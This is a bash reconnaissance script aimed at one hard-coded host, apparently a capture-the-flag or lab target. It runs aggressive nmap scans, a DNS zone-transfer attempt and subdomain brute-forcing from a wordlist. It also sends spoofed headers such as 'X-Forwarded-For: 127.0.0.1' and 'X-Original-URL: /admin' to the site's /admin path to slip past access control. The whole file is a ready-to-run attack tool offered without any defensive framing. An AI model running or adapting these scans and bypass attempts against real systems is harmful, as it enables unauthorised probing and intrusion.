#!/bin/bash

TARGET="liber8login.web.cityinthe.cloud"
WORDLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"  # Update path if needed
OUTDIR="recon_${TARGET}_$(date +%F_%H-%M-%S)"
mkdir "$OUTDIR"

echo "[*] Starting Nmap scan with -A -T4..."
nmap -A -T4 "$TARGET" -oN "$OUTDIR/nmap_full.txt"

echo "[*] Quick scan of common web ports..."
nmap -p 80,443,3000,3001,8000,8080,8443 -sV -Pn "$TARGET" -oN "$OUTDIR/nmap_webports.txt"

echo "[*] DIG - A/NS/MX records..."
dig "$TARGET" +noall +answer > "$OUTDIR/dig_A.txt"
dig NS "$TARGET" +noall +answer > "$OUTDIR/dig_NS.txt"
dig MX "$TARGET" +noall +answer > "$OUTDIR/dig_MX.txt"

echo "[*] Attempting DIG AXFR (zone transfer)..."
dig AXFR "$TARGET" @ns1."$TARGET" > "$OUTDIR/dig_AXFR.txt"

echo "[*] Running WHOIS..."
whois "$TARGET" > "$OUTDIR/whois.txt"

echo "[*] Testing common header bypass tricks with curl..."
for header in \
    "X-Forwarded-For: 127.0.0.1" \
    "X-Admin: true" \
    "X-Original-URL: /admin" \
    "X-Custom-IP-Authorization: 127.0.0.1"
do
    echo -e "\n--- Testing $header ---" >> "$OUTDIR/curl_bypass_results.txt"
    curl -sk -H "$header" "https://$TARGET/admin" >> "$OUTDIR/curl_bypass_results.txt"
done

echo "[*] Grabbing HTML titles and server headers for open web ports..."
for port in 80 443 3000 3001 8000 8080 8443; do
    echo -e "\n--- Port $port ---" >> "$OUTDIR/html_titles.txt"
    curl -sk -I "https://$TARGET:$port" >> "$OUTDIR/html_titles.txt"
    curl -sk "https://$TARGET:$port" | grep -iE "<title>.*</title>" >> "$OUTDIR/html_titles.txt"
done

echo "[*] Brute-forcing subdomains..."
while read sub; do
    host="$sub.$TARGET"
    ip=$(dig +short "$host")
    if [ -n "$ip" ]; then
        echo "$host -> $ip" | tee -a "$OUTDIR/subdomain_hits.txt"
    fi
done < "$WORDLIST"

echo "[✅] Recon complete! All data saved in: $OUTDIR"
